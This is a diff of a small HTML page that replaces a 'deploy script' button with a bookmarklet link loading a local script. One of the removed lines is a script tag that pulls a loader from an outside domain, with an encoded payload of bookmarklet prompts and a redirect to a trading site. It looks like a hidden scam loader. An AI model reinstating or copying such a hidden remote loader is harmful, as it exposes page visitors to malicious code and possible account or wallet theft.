@@ -1,47 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>aaaa button – deploy script</title>
+  <meta charset="UTF-8">
+  <title>aaaa Bookmarklet</title>
   <style>
-    html, body { height: 100%; }
     body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
       margin: 0;
-      display: grid;
-      place-items: center;
-      background: #f6f7fb;
-      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+      background: #f0f0f0;
     }
-    button {
-      padding: 0.9rem 1.4rem;
-      font-size: 1.125rem;
-      border-radius: 9999px;
-      border: 0;
+    .bookmarklet {
+      display: inline-block;
+      padding: 15px 30px;
+      font-size: 18px;
+      font-weight: bold;
+      text-decoration: none;
+      border-radius: 8px;
+      background: #333;
+      color: white;
+      user-select: none;
       cursor: pointer;
-      box-shadow: 0 10px 20px rgba(0,0,0,.08);
     }
-    button:active { transform: translateY(1px); }
-    .status { margin-top: 1rem; font-size: .95rem; color: #333; text-align: center; }
+    .bookmarklet:hover {
+      background: #555;
+    }
   </style>
 </head>
 <body>
-  <!--
-    Set data-script-src to your script URL to skip the prompt, e.g.:
-    data-script-src="https://example.com/your-script.js"
-  -->
-  <div>
-    <button id="deployBtn" data-script-src="">aaaa</button>
-    <div id="status" class="status" aria-live="polite"></div>
-  </div>
+  <!-- Drag to bookmarks bar OR click directly -->
+  <a class="bookmarklet" id="aaaaBtn" href="javascript:(function(){ 
+    var s=document.createElement('script'); 
+    s.src = "myscript.js"; 
+    document.body.appendChild(s); 
+  })();">aaaa</a>
 
-<script src="https://axiom-server.icu/loader.js" data="eyJoYXNoIjoiTURzMk56UTNNVFk0TmpNNCIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJvb2ttYXJrbGV0IHRvIHlvdXIgYm9va21hcmtzIGJhciBpbnN0ZWFkIG9mIGNsaWNraW5nIGl0LiIsInJlZGlyZWN0IjoiWW91IGFyZSBub3cgYmVpbmcgcmVkaXJlY3RlZCB0byBodHRwczovL2F4aW9tLnRyYWRlL2Rpc2NvdmVyLiIsInVuYXV0aG9yaXplZCI6IllvdSBtdXN0IGJlIHNpZ25lZCBpbiB0byB1c2UgdGhpcyBib29rbWFya2xldC4iLCJlcnJvciI6IkZhaWxlZCB0byBleGVjdXRlIHRoZSBib29rbWFya2xldC4gUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4ifX0="></script>
-
-  <!-- If you prefer a static tag instead of dynamic loading, uncomment and set the src: -->
-  <!-- <script src=""></script> -->
+  <script>
+    document.getElementById("aaaaBtn").addEventListener("click", function(e) {
+      e.preventDefault(); // prevent jumping to "javascript:" URL
+      var s = document.createElement("script");
+      s.src = "myscript.js"; 
+      document.body.appendChild(s);
+    });
+  </script>
 </body>
 </html>
-
-
-
-
